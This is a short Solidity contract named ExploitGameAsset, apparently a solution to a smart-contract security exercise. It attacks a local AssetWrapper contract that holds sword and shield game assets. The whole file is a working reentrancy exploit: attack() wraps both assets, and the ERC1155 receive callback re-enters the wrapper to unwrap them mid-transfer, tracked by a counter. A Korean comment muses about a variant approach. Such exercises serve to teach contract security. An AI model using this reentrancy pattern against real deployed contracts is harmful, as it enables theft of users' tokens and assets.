//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./AssetWrapper.sol";
import "./GameAsset.sol";
import "forge-std/console.sol";

contract ExploitGameAsset {

    AssetWrapper assetWrapper;
    GameAsset sword;
    GameAsset shield;

    address owner; 
    uint256 count;
    constructor(AssetWrapper _assetWrapper, GameAsset _sword, GameAsset _shield) public {
        assetWrapper = _assetWrapper;
        sword = _sword;
        shield = _shield;
        owner = msg.sender;
    }

    function attack() public {
        assetWrapper.wrap(0, address(this), address(sword));
        assetWrapper.wrap(0, address(this), address(shield));
    }


    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4){
        // 이거하기 전에 나한테 transfer하면 우쨰됨? 이게 가능하긴 한가?

        if(count == 0){
            assetWrapper.unwrap(address(this), address(sword));
        }
        else if(count == 1){
            assetWrapper.unwrap(address(this), address(shield));
        }

        count++;
        return IERC1155Receiver.onERC1155Received.selector;
    }

}